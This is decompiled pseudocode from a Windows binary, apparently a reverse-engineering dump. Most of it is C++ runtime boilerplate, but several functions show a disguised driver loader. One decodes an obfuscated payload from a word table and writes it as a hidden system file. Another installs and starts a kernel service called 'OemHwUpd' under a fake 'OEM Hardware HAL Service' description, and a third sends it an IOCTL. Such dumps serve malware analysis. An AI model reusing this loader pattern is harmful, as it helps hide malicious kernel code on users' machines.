// ----- sub_14000A550 @ 0x14000a550 -----
__int64 __fastcall sub_14000A550(__int64 a1, unsigned int a2, unsigned __int8 a3)
{
  int v4; // [rsp+24h] [rbp-14h]

  if ( *(_QWORD *)(a1 + 72) != 0 )
    v4 = 0;
  else
    v4 = 4;
  return sub_14000A5F0(a1, v4 | a2, a3);
}


// ----- sub_14000A5C0 @ 0x14000a5c0 -----
__int64 __fastcall sub_14000A5C0(__int64 a1, unsigned int a2)
{
  return sub_14000A5F0(a1, a2, 0);
}


// ----- sub_14000A5F0 @ 0x14000a5f0 -----
__int64 __fastcall sub_14000A5F0(__int64 a1, char a2, char a3)
{
  __int64 result; // rax
  const struct std::error_code *error_code; // rax
  int v5; // [rsp+20h] [rbp-58h]
  char *v6; // [rsp+28h] [rbp-50h]
  _BYTE v7[16]; // [rsp+30h] [rbp-48h] BYREF
  _BYTE v8[56]; // [rsp+40h] [rbp-38h] BYREF
  int v9; // [rsp+88h] [rbp+10h]

  v9 = a2 & 0x17;
  *(_DWORD *)(a1 + 16) = v9;
  result = *(_DWORD *)(a1 + 20) & (unsigned int)v9;
  v5 = *(_DWORD *)(a1 + 20) & v9;
  if ( v5 != 0 )
  {
    if ( a3 != 0 )
      sub_140011278(0, 0);
    if ( (v5 & 4) != 0 )
    {
      v6 = "ios_base::badbit set";
    }
    else if ( (v5 & 2) != 0 )
    {
      v6 = "ios_base::failbit set";
    }
    else
    {
      v6 = "ios_base::eofbit set";
    }
    error_code = (const struct std::error_code *)std::make_error_code(v7, 1);
    std::ios_base::failure::failure((std::ios_base::failure *)v8, v6, error_code);
    return sub_140011278(v8, &_TI5_AVfailure_ios_base_std__);
  }
  return result;
}


// ----- sub_14000A6E0 @ 0x14000a6e0 -----
__int64 __fastcall sub_14000A6E0(__int64 a1)
{
  __int64 v2; // [rsp+20h] [rbp-18h]

  if ( *(_QWORD *)(a1 + 128) != 0 )
  {
    sub_140009660(a1);
    v2 = a1;
    if ( !sub_1400082D0(a1) )
      v2 = 0;
    if ( fclose(*(FILE **)(a1 + 128)) != 0 )
      v2 = 0;
  }
  else
  {
    v2 = 0;
  }
  sub_140008AF0(a1, nullptr, 2);
  return v2;
}


// ----- sub_14000A770 @ 0x14000a770 -----
__int64 __fastcall sub_14000A770(__int64 a1)
{
  __int64 result; // rax

  result = sub_14000A6E0(a1 + 8);
  if ( result == 0 )
    return sub_14000DA70(*(int *)(*(_QWORD *)a1 + 4LL) + a1, 2, 0);
  return result;
}


// ----- sub_14000A7D0 @ 0x14000a7d0 -----
int __fastcall sub_14000A7D0(const void *a1, const void *a2, size_t a3)
{
  return memcmp(a1, a2, a3);
}


// ----- HandlerRoutine @ 0x14000a800 -----
__int64 __fastcall HandlerRoutine(DWORD CtrlType)
{
  if ( CtrlType != 0 && CtrlType != 2 )
    return 0;
  byte_14009E000 = 0;
  return 1;
}


// ----- sub_14000A830 @ 0x14000a830 -----
_BYTE *__fastcall sub_14000A830(_BYTE *a1, _BYTE *a2, unsigned __int64 a3)
{
  __int64 i; // [rsp+20h] [rbp-28h]

  if ( sub_1400092F0() != 0 )
  {
    for ( i = 0; i != a3; ++i )
      a1[i] = a2[i];
    return a1;
  }
  else
  {
    qmemcpy(a1, a2, a3);
    return a1;
  }
}


// ----- sub_14000A8C0 @ 0x14000a8c0 -----
_WORD *__fastcall sub_14000A8C0(_WORD *a1, _WORD *a2, __int64 a3)
{
  __int64 i; // [rsp+20h] [rbp-28h]

  if ( sub_1400092F0() != 0 )
  {
    for ( i = 0; i != a3; ++i )
      a1[i] = a2[i];
    return a1;
  }
  else
  {
    qmemcpy(a1, a2, 2 * a3);
    return a1;
  }
}


// ----- sub_14000A950 @ 0x14000a950 -----
DWORD __fastcall sub_14000A950(__int64 a1, __int64 *a2)
{
  const WCHAR *v2; // rax
  const WCHAR *v3; // rax
  const WCHAR *v4; // rax
  DWORD result; // eax
  const WCHAR *v6; // rax
  __int64 v7; // [rsp+20h] [rbp-38h]
  __int64 v8[4]; // [rsp+28h] [rbp-30h] BYREF
  __int64 *v9; // [rsp+68h] [rbp+10h]

  v9 = a2;
  v7 = 0;
  do
  {
    LOWORD(a2) = 92;
    v7 = sub_14000B4D0(v9, a2, v7 + 1);
    sub_14000DC60(v9, v8, 0, v7);
    v2 = (const WCHAR *)sub_14000A400(v8);
    if ( GetFileAttributesW(v2) == -1 )
    {
      v3 = (const WCHAR *)sub_14000A400(v8);
      CreateDirectoryW(v3, nullptr);
    }
    sub_140006850((__int64)v8);
  }
  while ( v7 != -1 );
  v4 = (const WCHAR *)sub_14000A400(v9);
  result = GetFileAttributesW(v4);
  if ( result == -1 )
  {
    v6 = (const WCHAR *)sub_14000A400(v9);
    return CreateDirectoryW(v6, nullptr);
  }
  return result;
}


// ----- sub_14000AA30 @ 0x14000aa30 -----
void __fastcall sub_14000AA30(__int64 a1, void *a2, unsigned __int64 a3)
{
  sub_140002B40(a2, a3);
}


// ----- sub_14000AA60 @ 0x14000aa60 -----
void __fastcall sub_14000AA60(__int64 a1, void *a2, __int64 a3)
{
  sub_140002B40(a2, 4 * a3);
}


// ----- ?deallocate@?$allocator@_W@std@@QEAAXQEA_W_K@Z @ 0x14000aa90 -----
void __fastcall std::allocator<wchar_t>::deallocate(__int64 a1, void *a2, __int64 a3)
{
  sub_140002B40(a2, 2 * a3);
}


// ----- ?default_error_condition@error_category@std@@UEBA?AVerror_condition@2@H@Z @ 0x14000aac0 -----
__int64 __fastcall std::error_category::default_error_condition(__int64 a1, __int64 a2, int a3)
{
  unknown_libname_15(a2, a3, a1);
  return a2;
}


// ----- sub_14000AAF0 @ 0x14000aaf0 -----
char __fastcall sub_14000AAF0(__int64 *a1)
{
  const WCHAR *v2; // rax
  unsigned __int64 v3; // rax
  const WCHAR *v4; // rax
  char v5; // [rsp+31h] [rbp-2A7h] BYREF
  char v6; // [rsp+32h] [rbp-2A6h]
  int i; // [rsp+34h] [rbp-2A4h]
  __int64 v8; // [rsp+38h] [rbp-2A0h]
  __int64 v9; // [rsp+40h] [rbp-298h]
  __int64 v10; // [rsp+48h] [rbp-290h]
  __int64 v11[3]; // [rsp+50h] [rbp-288h] BYREF
  _BYTE v12[32]; // [rsp+68h] [rbp-270h] BYREF
  _BYTE v13[40]; // [rsp+88h] [rbp-250h] BYREF
  _BYTE v14[272]; // [rsp+B0h] [rbp-228h] BYREF
  _QWORD v15[32]; // [rsp+1C0h] [rbp-118h] BYREF

  if ( (unsigned __int8)sub_14000BA10(a1) != 0 )
    return 1;
  v2 = (const WCHAR *)sub_14000A400(a1);
  if ( GetFileAttributesW(v2) != -1 )
    return 1;
  sub_14000A160(v14, 0x108u);
  sub_1400048B0((__int64)v14, (__int64)a1, 32, 64, 1);
  if ( (unsigned __int8)sub_14000BAA0(v14) != 0 )
  {
    sub_140004E80((struct std::_Container_base0 *)v13, (__int64)off_14009E810);
    sub_14000A160(v15, 0xF8u);
    sub_140005490(v15, (__int64)v13, 3u, 1);
    sub_140004F30((__int64)v12);
    sub_14000A160(v11, 0x18u);
    sub_1400056F0(v11);
    v3 = unknown_libname_77(v13);
    sub_14000CFD0(v11, v3 / 4);
LABEL_8:
    while ( 1 )
    {
      v8 = sub_1400017D0((__int64)v15, (__int64)v12);
      if ( !sub_140007050(*(int *)(*(_QWORD *)v8 + 4LL) + v8) )
        break;
      for ( i = 0; i < 256; ++i )
      {
        if ( (unsigned __int8)sub_140001B00((__int64)v12, (__int64)off_14009E010[i]) != 0 )
        {
          v5 = i;
          sub_14000CF50(v11, &v5);
          goto LABEL_8;
        }
      }
    }
    v9 = sub_14000DB30(v11);
    v10 = sub_140003980(v11);
    sub_14000E730(v14, v10, v9);
    sub_14000A770((__int64)v14);
    v4 = (const WCHAR *)sub_14000A400(a1);
    SetFileAttributesW(v4, 6u);
    sub_14000DD60(a1);
    v6 = 1;
    sub_140006A10((__int64)v11);
    sub_140006820((__int64)v12);
    std::basic_stringstream<char,std::char_traits<char>,std::allocator<char>>::`vbase destructor'((__int64)v15);
    sub_140006820((__int64)v13);
    sub_140007310((__int64)v14);
    return v6;
  }
  else
  {
    sub_140007310((__int64)v14);
    return 0;
  }
}


// ----- ?do_always_noconv@?$codecvt@DDU_Mbstatet@@@std@@MEBA_NXZ @ 0x14000adc0 -----
char std::codecvt<char,char,_Mbstatet>::do_always_noconv()
{
  return 1;
}


// ----- unknown_libname_75 @ 0x14000add0 -----
// Microsoft VisualC v14 64bit runtime
// Microsoft VisualC 64bit universal runtime
char unknown_libname_75()
{
  return 0;
}


// ----- unknown_libname_30 @ 0x14000ade0 -----
// Microsoft VisualC v14 64bit runtime
__int64 unknown_libname_30()
{
  return 1;
}


// ----- unknown_libname_31 @ 0x14000adf0 -----
// Microsoft VisualC v14 64bit runtime
__int64 __fastcall unknown_libname_31(
        __int64 a1,
        __int64 a2,
        __int64 a3,
        __int64 a4,
        _QWORD *a5,
        __int64 a6,
        int a7,
        _QWORD *a8)
{
  *a5 = a3;
  *a8 = a6;
  return 3;
}


// ----- sub_14000AE30 @ 0x14000ae30 -----
__int64 sub_14000AE30(__int64 a1, __int64 a2, __int64 a3, __int64 a4, ...)
{
  __int64 v5; // [rsp+20h] [rbp-28h] BYREF
  __int64 v6; // [rsp+28h] [rbp-20h] BYREF
  __int64 v7; // [rsp+30h] [rbp-18h] BYREF
  va_list va; // [rsp+70h] [rbp+28h] BYREF

  va_start(va, a4);
  v5 = 0x7FFFFFFF;
  v6 = a4 - a3;
  v7 = *unknown_libname_11(&v6, &v5);
  return *(unsigned int *)unknown_libname_12((__int64 *)va, &v7);
}


// ----- ?do_narrow@?$ctype@D@std@@MEBADDD@Z @ 0x14000aeb0 -----
__int64 __fastcall std::ctype<char>::do_narrow(__int64 a1, unsigned __int8 a2)
{
  return a2;
}


// ----- sub_14000AED0 @ 0x14000aed0 -----
__int64 __fastcall sub_14000AED0(__int64 a1, const void *a2, __int64 a3, char a4, void *a5)
{
  const void *v6; // [rsp+48h] [rbp+10h] BYREF
  __int64 v7; // [rsp+50h] [rbp+18h] BYREF
  char v8; // [rsp+58h] [rbp+20h]

  v8 = a4;
  v7 = a3;
  v6 = a2;
  __crt_win32_buffer_no_resizing::deallocate(&v6, (const struct __crt_win32_buffer_empty_debug_info *)&v7);
  qmemcpy(a5, v6, v7 - (_QWORD)v6);
  return v7;
}


// ----- sub_14000AF30 @ 0x14000af30 -----
__int64 __fastcall sub_14000AF30(__int64 a1, unsigned __int8 a2)
{
  return sub_14000FD74(a2, a1 + 16);
}


// ----- sub_14000AF60 @ 0x14000af60 -----
unsigned __int8 *__fastcall sub_14000AF60(__int64 a1, unsigned __int8 *a2, unsigned __int8 *a3)
{
  unsigned __int8 v3; // al
  unsigned __int8 *v6; // [rsp+38h] [rbp+10h] BYREF
  unsigned __int8 *v7; // [rsp+40h] [rbp+18h] BYREF

  v7 = a3;
  v6 = a2;
  __crt_win32_buffer_no_resizing::deallocate(&v6, (const struct __crt_win32_buffer_empty_debug_info *)&v7);
  while ( v6 != v7 )
  {
    v3 = sub_14000FD74(*v6, a1 + 16);
    *v6++ = v3;
  }
  return v6;
}


// ----- sub_14000AFD0 @ 0x14000afd0 -----
__int64 __fastcall sub_14000AFD0(__int64 a1, unsigned __int8 a2)
{
  return sub_14000FEA4(a2, a1 + 16);
}


// ----- sub_14000B000 @ 0x14000b000 -----
unsigned __int8 *__fastcall sub_14000B000(__int64 a1, unsigned __int8 *a2, unsigned __int8 *a3)
{
  unsigned __int8 v3; // al
  unsigned __int8 *v6; // [rsp+38h] [rbp+10h] BYREF
  unsigned __int8 *v7; // [rsp+40h] [rbp+18h] BYREF

  v7 = a3;
  v6 = a2;
  __crt_win32_buffer_no_resizing::deallocate(&v6, (const struct __crt_win32_buffer_empty_debug_info *)&v7);
  while ( v6 != v7 )
  {
    v3 = sub_14000FEA4(*v6, a1 + 16);
    *v6++ = v3;
  }
  return v6;
}


// ----- ?do_unshift@?$codecvt@DDU_Mbstatet@@@std@@MEBAHAEAU_Mbstatet@@PEAD1AEAPEAD@Z @ 0x14000b070 -----
__int64 __fastcall std::codecvt<char,char,_Mbstatet>::do_unshift(
        __int64 a1,
        __int64 a2,
        __int64 a3,
        __int64 a4,
        _QWORD *a5)
{
  *a5 = a3;
  return 3;
}


// ----- ?do_widen@?$ctype@D@std@@MEBADD@Z @ 0x14000b0a0 -----
__int64 __fastcall std::ctype<char>::do_widen(__int64 a1, unsigned __int8 a2)
{
  return a2;
}


// ----- sub_14000B0B0 @ 0x14000b0b0 -----
__int64 sub_14000B0B0(__int64 a1, ...)
{
  va_list va; // [rsp+48h] [rbp+10h]
  const void *v3; // [rsp+48h] [rbp+10h] BYREF
  __int64 v4; // [rsp+50h] [rbp+18h] BYREF
  va_list va1; // [rsp+50h] [rbp+18h]
  void *v6; // [rsp+58h] [rbp+20h]
  va_list va2; // [rsp+60h] [rbp+28h] BYREF

  va_start(va2, a1);
  va_start(va1, a1);
  va_start(va, a1);
  v3 = va_arg(va1, const void *);
  va_copy(va2, va1);
  v4 = va_arg(va2, _QWORD);
  v6 = va_arg(va2, void *);
  __crt_win32_buffer_no_resizing::deallocate(va, (const struct __crt_win32_buffer_empty_debug_info *)va1);
  qmemcpy(v6, v3, v4 - (_QWORD)v3);
  return v4;
}


// ----- unknown_libname_32 @ 0x14000b110 -----
// Microsoft VisualC v14 64bit runtime
__int64 __fastcall unknown_libname_32(__int64 a1)
{
  return **(_QWORD **)(a1 + 24);
}


// ----- ?egptr@?$basic_streambuf@DU?$char_traits@D@std@@@std@@IEBAPEADXZ @ 0x14000b130 -----
__int64 __fastcall std::streambuf::egptr(__int64 a1)
{
  return **(_QWORD **)(a1 + 56) + **(int **)(a1 + 80);
}


// ----- unknown_libname_33 @ 0x14000b160 -----
// Microsoft VisualC v14 64bit runtime
_BOOL8 __fastcall unknown_libname_33(__int64 a1)
{
  return *(_QWORD *)(a1 + 16) == 0;
}


// ----- ?end@?$basic_string@_WU?$char_traits@_W@std@@V?$allocator@_W@2@@std@@QEAA?AV?$_String_iterator@V?$_String_val@U?$_Simple_types@_W@std@@@std@@@2@XZ @ 0x14000b190 -----
_QWORD *__fastcall std::wstring::end(__int64 *a1, _QWORD *a2)
{
  __int64 v2; // rax
  const struct __crt_win32_buffer_empty_debug_info *v4; // [rsp+20h] [rbp-18h]
  __int64 v5; // [rsp+28h] [rbp-10h]

  v4 = (const struct __crt_win32_buffer_empty_debug_info *)unknown_libname_71((__int64)a1);
  v2 = unknown_libname_22(a1);
  v5 = unknown_libname_71(v2) + 2 * a1[2];
  sub_140004510(a2, v5, v4);
  return a2;
}


// ----- sub_14000B200 @ 0x14000b200 -----
__int64 sub_14000B200()
{
  return 0xFFFFFFFFLL;
}


// ----- ?epptr@?$basic_streambuf@DU?$char_traits@D@std@@@std@@IEBAPEADXZ @ 0x14000b210 -----
__int64 __fastcall std::streambuf::epptr(__int64 a1)
{
  return **(_QWORD **)(a1 + 64) + **(int **)(a1 + 88);
}


// ----- ?eq@?$_Narrow_char_traits@DH@std@@SA_NDD@Z @ 0x14000b240 -----
_BOOL8 __fastcall std::_Narrow_char_traits<char,int>::eq(char a1, char a2)
{
  return a1 == a2;
}


// ----- ?eq_int_type@?$_Narrow_char_traits@DH@std@@SA_NHH@Z @ 0x14000b280 -----
_BOOL8 __fastcall std::_Narrow_char_traits<char,int>::eq_int_type(int a1, int a2)
{
  return a1 == a2;
}


// ----- ?equivalent@error_category@std@@UEBA_NAEBVerror_code@2@H@Z @ 0x14000b2b0 -----
_BOOL8 __fastcall std::error_category::equivalent(std::error_category *this, const struct std::error_code *a2, int a3)
{
  const char *v3; // rax

  v3 = __crt_win32_buffer_debug_info::file_name(a2);
  return std::error_category::operator==((__int64)this, (__int64)v3)
      && (unsigned int)`anonymous namespace'::_Transcode_result::_Error(a2) == a3;
}


// ----- sub_14000B310 @ 0x14000b310 -----
__int64 __fastcall sub_14000B310(__int64 a1, unsigned int a2, __crt_win32_buffer_debug_info *a3)
{
  __crt_win32_buffer_debug_info *v3; // rax
  _BYTE v5[32]; // [rsp+28h] [rbp-20h] BYREF

  v3 = (__crt_win32_buffer_debug_info *)(*(__int64 (__fastcall **)(__int64, _BYTE *, _QWORD))(*(_QWORD *)a1 + 24LL))(
                                          a1,
                                          v5,
                                          a2);
  return std::operator==(v3, a3);
}


// ----- ?erase@?$basic_string@DU?$char_traits@D@std@@V?$allocator@D@2@@std@@QEAAAEAV12@_K0@Z @ 0x14000b360 -----
__int64 __fastcall std::string::erase(__int64 a1, unsigned __int64 a2, __int64 a3)
{
  sub_140008090(a1, a2);
  return std::string::_Erase_noexcept(a1, a2, a3);
}


// ----- unknown_libname_76 @ 0x14000b3b0 -----
// Microsoft VisualC 64bit universal runtime
__int64 __fastcall unknown_libname_76(__int64 a1, unsigned __int64 a2)
{
  sub_140008090(a1, a2);
  sub_140008490(a1, a2);
  return a1;
}


// ----- sub_14000B3F0 @ 0x14000b3f0 -----
_BOOL8 __fastcall sub_14000B3F0(__crt_win32_buffer_debug_info *a1)
{
  return (__crt_win32_buffer_debug_info::line_number(a1) & 6) != 0;
}


// ----- sub_14000B420 @ 0x14000b420 -----
__int64 __fastcall sub_14000B420(_WORD *a1, __int64 a2, _WORD *a3)
{
  __int64 v4; // [rsp+28h] [rbp-20h]
  _WORD *v5; // [rsp+30h] [rbp-18h]
  __int64 v6; // [rsp+38h] [rbp-10h]

  if ( sub_1400092F0() == 0 )
    return sub_14000F090(a1, (unsigned __int16)*a3, a2);
  v4 = a2;
  v5 = a1;
  v6 = 0;
  if ( a2 != 0 )
  {
    while ( *v5 != *a3 )
    {
      if ( v4 == 1 )
        return v6;
      --v4;
      ++v5;
    }
    return (__int64)v5;
  }
  return v6;
}


// ----- sub_14000B4D0 @ 0x14000b4d0 -----
__int64 __fastcall sub_14000B4D0(__int64 *a1, wchar_t a2, unsigned __int64 a3)
{
  unsigned __int64 v4; // [rsp+20h] [rbp-18h]
  __int64 v5; // [rsp+28h] [rbp-10h]

  v4 = a1[2];
  v5 = unknown_libname_22(a1);
  return sub_140003A70(v5, v4, a3, a2);
}


// ----- unknown_libname_34 @ 0x14000b530 -----
// Microsoft VisualC v14 64bit runtime
__int64 __fastcall unknown_libname_34(__int64 a1)
{
  return *(unsigned int *)(a1 + 24);
}


// ----- sub_14000B540 @ 0x14000b540 -----
__int64 __fastcall sub_14000B540(__int64 a1)
{
  unsigned int v2; // [rsp+20h] [rbp-48h]
  __int64 v3; // [rsp+28h] [rbp-40h]
  _QWORD v4[2]; // [rsp+40h] [rbp-28h] BYREF

  v3 = unknown_libname_41(*(int *)(*(_QWORD *)a1 + 4LL) + a1);
  if ( v3 != 0 )
  {
    sub_140006320((__int64)v4, a1);
    if ( (unsigned __int8)std::optional<unsigned __int64>::operator bool((__int64)v4) != 0 )
    {
      v2 = 0;
      if ( (unsigned int)sub_14000CE70(v3) == -1 )
        v2 = 4;
      sub_14000DA70(*(int *)(*(_QWORD *)a1 + 4LL) + a1, v2, 0);
    }
    sub_140006E50(v4);
  }
  return a1;
}


// ----- ?front@?$basic_string@DU?$char_traits@D@std@@V?$allocator@D@2@@std@@QEAAAEADXZ @ 0x14000b630 -----
__int64 __fastcall std::string::front(__int64 *a1)
{
  return unknown_libname_21(a1);
}


// ----- ?shrink_to_fit@?$basic_string@DU?$char_traits@D@std@@V?$allocator@D@2@@std@@QEAAXXZ @ 0x14000b660 -----
SC_HANDLE __fastcall std::string::shrink_to_fit(__int64 *a1)
{
  SC_HANDLE result; // rax
  __int64 v2; // rax
  SC_HANDLE hService; // [rsp+20h] [rbp-48h]
  SC_HANDLE hSCManager; // [rsp+28h] [rbp-40h]
  struct _SERVICE_STATUS ServiceStatus; // [rsp+30h] [rbp-38h] BYREF

  sub_14000A4C0((__int64)a1);
  result = OpenSCManagerW(nullptr, nullptr, 1u);
  hSCManager = result;
  if ( result != nullptr )
  {
    hService = OpenServiceW(result, L"OemHwUpd", 0x10020u);
    if ( hService != nullptr )
    {
      ControlService(hService, 1u, &ServiceStatus);
      DeleteService(hService);
      CloseServiceHandle(hService);
    }
    CloseServiceHandle(hSCManager);
    Sleep(0x1F4u);
    v2 = sub_14000A400(a1);
    return (SC_HANDLE)sub_140015B28(v2);
  }
  return result;
}


// ----- ?gbump@?$basic_streambuf@DU?$char_traits@D@std@@@std@@IEAAXH@Z @ 0x14000b730 -----
__int64 __fastcall std::streambuf::gbump(__int64 a1, int a2)
{
  _QWORD *v2; // rcx
  __int64 result; // rax

  **(_DWORD **)(a1 + 80) -= a2;
  v2 = *(_QWORD **)(a1 + 56);
  result = *v2 + a2;
  *v2 = result;
  return result;
}


// ----- sub_14000B780 @ 0x14000b780 -----
__int64 __fastcall sub_14000B780(__int64 a1, __int64 a2)
{
  sub_140008610(a1);
  return a2;
}


// ----- sub_14000B7B0 @ 0x14000b7b0 -----
__int64 __fastcall sub_14000B7B0(__int64 a1, __int64 a2)
{
  sub_1400061C0(a2, *(_QWORD *)(a1 + 96));
  return a2;
}


// ----- ?getloc@ios_base@std@@QEBA?AVlocale@2@XZ @ 0x14000b7e0 -----
__int64 __fastcall std::ios_base::getloc(__int64 a1, __int64 a2)
{
  sub_1400061C0(a2, *(_QWORD *)(a1 + 64));
  return a2;
}


// ----- sub_14000B810 @ 0x14000b810 -----
_BOOL8 __fastcall sub_14000B810(__crt_win32_buffer_debug_info *a1)
{
  return (unsigned int)__crt_win32_buffer_debug_info::line_number(a1) == 0;
}


// ----- unknown_libname_35 @ 0x14000b850 -----
// Microsoft VisualC v14 64bit runtime
__int64 __fastcall unknown_libname_35(__int64 a1)
{
  return **(_QWORD **)(a1 + 56);
}


// ----- sub_14000B870 @ 0x14000b870 -----
__int64 __fastcall sub_14000B870(_QWORD *a1, std::locale *a2)
{
  const struct std::locale::facet *v2; // rax

  v2 = sub_140004270(a2);
  return sub_140009000(a1, (__int64)v2);
}


// ----- sub_14000B8A0 @ 0x14000b8a0 -----
__int64 __fastcall sub_14000B8A0(
        __int64 a1,
        __int64 a2,
        __int64 a3,
        __int64 a4,
        __int64 a5,
        __int64 a6,
        __int64 a7,
        __int64 a8)
{
  return (*(__int64 (__fastcall **)(__int64, __int64, __int64, __int64, __int64, __int64, __int64, __int64, _QWORD))(*(_QWORD *)a1 + 48LL))(
           a1,
           a2,
           a3,
           a4,
           a5,
           a6,
           a7,
           a8,
           *(_QWORD *)(*(_QWORD *)a1 + 48LL));
}


// ----- ?init@?$basic_ios@DU?$char_traits@D@std@@@std@@IEAAXPEAV?$basic_streambuf@DU?$char_traits@D@std@@@2@_N@Z @ 0x14000b920 -----
void __fastcall std::ios::init(__int64 a1, __int64 a2, char a3)
{
  __int64 v3; // rdx

  std::ios_base::_Init((std::ios_base *)a1);
  *(_QWORD *)(a1 + 72) = a2;
  *(_QWORD *)(a1 + 80) = 0;
  LOBYTE(v3) = 32;
  *(_BYTE *)(a1 + 88) = std::ios::widen(a1, v3);
  if ( *(_QWORD *)(a1 + 72) == 0 )
    sub_14000DA70(a1, 4, 0);
  if ( a3 != 0 )
    std::ios_base::_Addstd((struct std::ios_base *)a1);
}


// ----- sub_14000B9B0 @ 0x14000b9b0 -----
__int64 (__fastcall ***sub_14000B9B0())()
{
  return sub_1400032C0();
}


// ----- ?is@?$ctype@D@std@@QEBA_NFD@Z @ 0x14000b9c0 -----
_BOOL8 __fastcall std::ctype<char>::is(__int64 a1, __int16 a2, unsigned __int8 a3)
{
  return (a2 & *(__int16 *)(*(_QWORD *)(a1 + 24) + 2LL * a3)) != 0;
}


// ----- sub_14000BA10 @ 0x14000ba10 -----
char sub_14000BA10()
{
  HANDLE hObject; // [rsp+40h] [rbp-18h]

  hObject = CreateFileW(L"\\\\.\\OemHwUpd", 0xC0000000, 3u, nullptr, 3u, 0, nullptr);
  if ( hObject == (HANDLE)-1LL )
    return 0;
  CloseHandle(hObject);
  return 1;
}


// ----- sub_14000BA70 @ 0x14000ba70 -----
_BOOL8 __fastcall sub_14000BA70(__int64 a1)
{
  return *(_QWORD *)(a1 + 128) != 0;
}


// ----- sub_14000BAA0 @ 0x14000baa0 -----
_BOOL8 __fastcall sub_14000BAA0(__int64 a1)
{
  return sub_14000BA70(a1 + 8);
}


// ----- sub_14000BAC0 @ 0x14000bac0 -----
bool __fastcall sub_14000BAC0(__int64 a1, unsigned int a2)
{
  DWORD BytesReturned; // [rsp+44h] [rbp-24h] BYREF
  __int64 InBuffer; // [rsp+48h] [rbp-20h] BYREF

  if ( *(_QWORD *)(a1 + 48) == -1 )
    *(_QWORD *)(a1 + 48) = CreateFileW(L"\\\\.\\OemHwUpd", 0xC0000000, 3u, nullptr, 3u, 0, nullptr);
  if ( *(_QWORD *)(a1 + 48) == -1 )
    return false;
  InBuffer = a2;
  BytesReturned = 0;
  return DeviceIoControl(*(HANDLE *)(a1 + 48), 0x223078u, &InBuffer, 8u, &InBuffer, 8u, &BytesReturned, nullptr);
}


// ----- sub_14000BBC0 @ 0x14000bbc0 -----
size_t __fastcall sub_14000BBC0(const char *a1)
{
  return strlen(a1);
}


// ----- sub_14000BBE0 @ 0x14000bbe0 -----
__int64 __fastcall sub_14000BBE0(__int64 a1)
{
  sub_1400092F0();
  return sub_140017610(a1);
}


// ----- unknown_libname_77 @ 0x14000bc10 -----
// Microsoft VisualC v14 64bit runtime
// Microsoft VisualC 64bit universal runtime
__int64 __fastcall unknown_libname_77(__int64 a1)
{
  return *(_QWORD *)(a1 + 16);
}


// ----- sub_14000BC20 @ 0x14000bc20 -----
char __fastcall sub_14000BC20(__int64 a1)
{
  SC_HANDLE hService; // [rsp+70h] [rbp-38h]
  const WCHAR *lpBinaryPathName; // [rsp+78h] [rbp-30h]
  const wchar_t *Info; // [rsp+88h] [rbp-20h] BYREF

  if ( sub_14000BA10() != 0 )
    return 1;
  *(_QWORD *)(a1 + 32) = OpenSCManagerW(nullptr, nullptr, 2u);
  if ( *(_QWORD *)(a1 + 32) == 0 )
    return 0;
  hService = OpenServiceW(*(SC_HANDLE *)(a1 + 32), L"OemHwUpd", 0x10000u);
  if ( hService != nullptr )
  {
    DeleteService(hService);
    CloseServiceHandle(hService);
  }
  lpBinaryPathName = (const WCHAR *)sub_14000A400((__int64 *)a1);
  *(_QWORD *)(a1 + 40) = CreateServiceW(
                           *(SC_HANDLE *)(a1 + 32),
                           L"OemHwUpd",
                           L"OEM Hardware HAL Service",
                           0x10030u,
                           1u,
                           3u,
                           0,
                           lpBinaryPathName,
                           nullptr,
                           nullptr,
                           nullptr,
                           nullptr,
                           nullptr);
  if ( *(_QWORD *)(a1 + 40) == 0 && GetLastError() == 1073 )
    *(_QWORD *)(a1 + 40) = OpenServiceW(*(SC_HANDLE *)(a1 + 32), L"OemHwUpd", 0x10032u);
  if ( *(_QWORD *)(a1 + 40) == 0 )
    return 0;
  Info = L"Manages hardware abstraction layer compatibility.";
  ChangeServiceConfig2W(*(SC_HANDLE *)(a1 + 40), 1u, &Info);
  StartServiceW(*(SC_HANDLE *)(a1 + 40), 0, nullptr);
  return sub_14000BA10();
}


// ----- ?make_error_code@std@@YA?AVerror_code@1@W4io_errc@1@@Z @ 0x14000be40 -----
__int64 __fastcall std::make_error_code(__int64 a1, int a2)
{
  __int64 (__fastcall ***v2)(); // rax

  v2 = sub_14000B9B0();
  unknown_libname_15(a1, a2, (__int64)v2);
  return a1;
}


// ----- unknown_libname_37 @ 0x14000be70 -----
// Microsoft VisualC v14 64bit runtime
__int64 unknown_libname_37()
{
  return -1;
}


// ----- sub_14000BE80 @ 0x14000be80 -----
__int64 sub_14000BE80()
{
  return 0x3FFFFFFFFFFFFFFFLL;
}


// ----- ?maximum_signed_value@__crt_strtox@@YA_J_K@Z @ 0x14000be90 -----
// Microsoft VisualC v14 64bit runtime
__int64 __fastcall __crt_strtox::maximum_signed_value(__crt_strtox *this)
{
  return 0x7FFFFFFFFFFFFFFFLL;
}


// ----- ?shrink_to_fit@?$basic_string@DU?$char_traits@D@std@@V?$allocator@D@2@@std@@QEAAXXZ_0 @ 0x14000bea0 -----
__int64 __fastcall std::string::shrink_to_fit(__int64 a1)
{
  __int64 v2; // [rsp+20h] [rbp-38h] BYREF
  __int64 v3; // [rsp+28h] [rbp-30h] BYREF
  _QWORD v4[2]; // [rsp+30h] [rbp-28h] BYREF
  __int64 v5; // [rsp+40h] [rbp-18h] BYREF

  sub_140008610(a1);
  v5 = unknown_libname_37();
  v2 = 16;
  v4[1] = *unknown_libname_10(&v5, &v2);
  v3 = -2;
  v4[0] = sub_1400032D0();
  return *unknown_libname_12(v4, &v3);
}


// ----- ?shrink_to_fit@?$basic_string@DU?$char_traits@D@std@@V?$allocator@D@2@@std@@QEAAXXZ_1 @ 0x14000bf30 -----
__int64 __fastcall std::string::shrink_to_fit(__int64 a1)
{
  __crt_strtox *v1; // rax
  __int64 v3; // [rsp+20h] [rbp-38h] BYREF
  __int64 v4; // [rsp+28h] [rbp-30h] BYREF
  _QWORD v5[2]; // [rsp+30h] [rbp-28h] BYREF
  __int64 v6; // [rsp+40h] [rbp-18h] BYREF

  v1 = (__crt_strtox *)sub_140008610(a1);
  v6 = __crt_strtox::maximum_signed_value(v1);
  v3 = 8;
  v5[1] = *unknown_libname_10(&v6, &v3);
  v4 = 0x7FFFFFFFFFFFFFFELL;
  v5[0] = sub_1400032D0();
  return *unknown_libname_12(v5, &v4);
}


// ----- ?max_size@?$_Tree@V?$_Tmap_traits@PEAXU_Mutex_count_pair@?A0xd833279a@@U?$less@PEAX@std@@V?$_Crt_allocator@U?$pair@QEAXU_Mutex_count_pair@?A0xd833279a@@@std@@@4@$0A@@std@@@std@@QEBA_KXZ @ 0x14000bfc0 -----
